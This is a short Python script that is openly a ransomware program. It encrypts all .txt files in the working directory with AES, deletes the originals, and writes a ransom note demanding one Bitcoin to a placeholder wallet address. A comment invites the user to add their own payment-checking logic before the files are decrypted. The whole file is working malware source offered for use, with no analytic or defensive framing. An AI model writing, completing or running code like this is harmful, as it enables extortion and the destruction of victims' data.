import os
import sys
import glob
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
from Crypto.Random import get_random_bytes

# Configuration
TARGET_EXTENSION = ".txt"
ENCRYPTED_EXTENSION = ".encrypted"
RANSOM_NOTE = "RANSOM_NOTE.txt"
RANSOM_AMOUNT = 1.0  # in Bitcoin

def encrypt_file(file_path, key):
    try:
        with open(file_path, "rb") as file:
            data = file.read()
        
        cipher = AES.new(key, AES.MODE_CBC)
        encrypted_data = cipher.encrypt(pad(data, AES.block_size))
        
        with open(file_path + ENCRYPTED_EXTENSION, "wb") as encrypted_file:
            encrypted_file.write(cipher.iv + encrypted_data)
        
        os.remove(file_path)
        print(f"File encrypted: {file_path}")
    except Exception as e:
        print(f"Error encrypting file: {file_path}")
        print(str(e))

def decrypt_file(file_path, key):
    try:
        with open(file_path, "rb") as encrypted_file:
            iv = encrypted_file.read(16)
            encrypted_data = encrypted_file.read()
        
        cipher = AES.new(key, AES.MODE_CBC, iv=iv)
        decrypted_data = unpad(cipher.decrypt(encrypted_data), AES.block_size)
        
        with open(file_path[:-len(ENCRYPTED_EXTENSION)], "wb") as decrypted_file:
            decrypted_file.write(decrypted_data)
        
        os.remove(file_path)
        print(f"File decrypted: {file_path}")
    except Exception as e:
        print(f"Error decrypting file: {file_path}")
        print(str(e))

def main():
    key = get_random_bytes(16)
    
    # Encrypt files
    for file_path in glob.glob(f"*{TARGET_EXTENSION}"):
        encrypt_file(file_path, key)
    
    # Create ransom note
    with open(RANSOM_NOTE, "w") as ransom_note:
        ransom_note.write(f"Your files have been encrypted!\n")
        ransom_note.write(f"To decrypt your files, you must pay {RANSOM_AMOUNT} Bitcoin to the following address:\n")
        ransom_note.write("YOUR_BITCOIN_ADDRESS\n")
        ransom_note.write("Once the payment is made, your files will be decrypted.\n")
    
    print("Ransom note created.")
    
    # Wait for ransom payment
    # Implement your own logic to check for payment
    # Once payment is received, decrypt files
    for file_path in glob.glob(f"*{ENCRYPTED_EXTENSION}"):
        decrypt_file(file_path, key)

if __name__ == "__main__":
    main()